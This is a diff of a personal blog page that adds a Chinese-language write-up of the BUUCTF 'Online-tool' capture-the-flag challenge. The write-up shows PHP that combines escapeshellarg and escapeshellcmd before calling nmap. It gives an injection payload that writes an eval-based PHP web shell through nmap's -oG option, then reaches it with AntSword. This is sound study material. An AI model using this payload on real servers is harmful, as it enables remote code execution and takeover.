@@ -6,21 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>categories | Welcome to Tristan&#39;s Blog!</title>
+  <title>Online-tool | Welcome to Tristan&#39;s Blog!</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="南京邮电大学2018级，web狗~；个人技术分享博客~">
-<meta property="og:type" content="website">
-<meta property="og:title" content="categories">
-<meta property="og:url" content="http://yoursite.com/categories/index.html">
+  <meta name="description" content="BUUCTF Online-tool知识点1、PHP代码审计（escapeshellarg，escapeshellcmd连用产生漏洞）2、利用Nmap GetShell 点开题目，发现源码： &lt;?php  if (isset($_SERVER[&amp;apos;HTTP_X_FORWARDED_FOR&amp;apos;])) {     $_SERVER[&amp;apos;REMOTE_ADDR&amp;apos;]">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Online-tool">
+<meta property="og:url" content="http://yoursite.com/2020/04/11/Online-tool/index.html">
 <meta property="og:site_name" content="Welcome to Tristan&#39;s Blog!">
-<meta property="og:description" content="南京邮电大学2018级，web狗~；个人技术分享博客~">
+<meta property="og:description" content="BUUCTF Online-tool知识点1、PHP代码审计（escapeshellarg，escapeshellcmd连用产生漏洞）2、利用Nmap GetShell 点开题目，发现源码： &lt;?php  if (isset($_SERVER[&amp;apos;HTTP_X_FORWARDED_FOR&amp;apos;])) {     $_SERVER[&amp;apos;REMOTE_ADDR&amp;apos;]">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2020-03-24T05:29:50.000Z">
-<meta property="article:modified_time" content="2020-03-24T05:29:50.730Z">
+<meta property="article:published_time" content="2020-04-11T10:11:07.000Z">
+<meta property="article:modified_time" content="2020-04-11T13:55:58.964Z">
 <meta property="article:author" content="Tristan">
-<meta property="article:tag" content="web">
-<meta property="article:tag" content="CTFer，hardworking">
-<meta property="article:tag" content="passionate">
+<meta property="article:tag" content="PHP代码审计，RCE">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="Welcome to Tristan&#39;s Blog!" type="application/atom+xml">
@@ -139,27 +137,51 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="page-" class="article article-type-page " itemscope itemprop="blogPost">
+            <article id="post-Online-tool" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      categories
+      Online-tool
     </h1>
   
 
         
-        <a href="/categories/index.html" class="archive-article-date">
-  	<time datetime="2020-03-24T05:29:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-24</time>
+        <a href="/2020/04/11/Online-tool/" class="archive-article-date">
+  	<time datetime="2020-04-11T10:11:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-11</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <h3 id="BUUCTF-Online-tool"><a href="#BUUCTF-Online-tool" class="headerlink" title="BUUCTF Online-tool"></a>BUUCTF Online-tool</h3><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>1、PHP代码审计（escapeshellarg，escapeshellcmd连用产生漏洞）<br>2、利用Nmap GetShell</p>
+<p>点开题目，发现源码：</p>
+<pre><code>&lt;?php
+
+if (isset($_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;])) {
+    $_SERVER[&apos;REMOTE_ADDR&apos;] = $_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;];
+}
+
+if(!isset($_GET[&apos;host&apos;])) {
+    highlight_file(__FILE__);
+} else {
+    $host = $_GET[&apos;host&apos;];
+    $host = escapeshellarg($host);
+    $host = escapeshellcmd($host);
+    $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&apos;REMOTE_ADDR&apos;]);
+    echo &apos;you are in sandbox &apos;.$sandbox;
+    @mkdir($sandbox);
+    chdir($sandbox);
+    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);
+}</code></pre><p>发现最后一行有system()，猜测应该就是利用这个达到RCE的效果了；第一想法是利用“；”或“|”执行自己的命令；但发现$host经过两个函数escapeshellarg，escapeshellcmd处理；先来学习了解一下这两个函数：<br>escapeshellarg():将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的;<br>说白了就是将单引号进行转义，然后将前后部分分别用单引号括起来；<br>escapeshellcmd() ： 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。<br>说白了就是对”&amp;#;`|*?~&lt;&gt;^()[]{}$, \x0A 和 \xFF”进行反斜线转义；以及对于落单的单引号和双引号也会进行转义；<br>知道了这两个函数值后，我们回到题目，正常输入就是一个ip地址：127.0.0.1<br>拼接后就是对该IP地址扫描；那怎样才能有RCE的效果呢，尝试输入:</p>
+<pre><code>&apos; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &apos; 
+
+经过escapeshellarg()处理后，变为&apos;&apos;\&apos; &apos;&lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php&apos; \&apos;&apos;&apos; 
+经过escapeshellcmd()处理后，变为&apos;&apos;\\&apos; &apos;\&lt;\?php @eval\(\$_POST\[&quot;hack&quot;\]\);\?\&gt; -oG hack.php&apos; \\&apos;&apos;\&apos;,即为\ &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php;</code></pre><p>这时回返回给文件所在目录；使用蚁剑连接，拿flag</p>
+
       
 
       
@@ -167,6 +189,17 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">PHP代码审计，RCE</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -217,7 +250,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/categories/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/04/11/Online-tool/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -229,6 +262,16 @@
 </article>
 
   
+<nav id="article-nav">
+  
+  
+    <a href="/2020/04/11/phpmyadmin4-8-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">phpmyadmin4.8.1 任意文件包含漏洞</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -279,7 +322,7 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
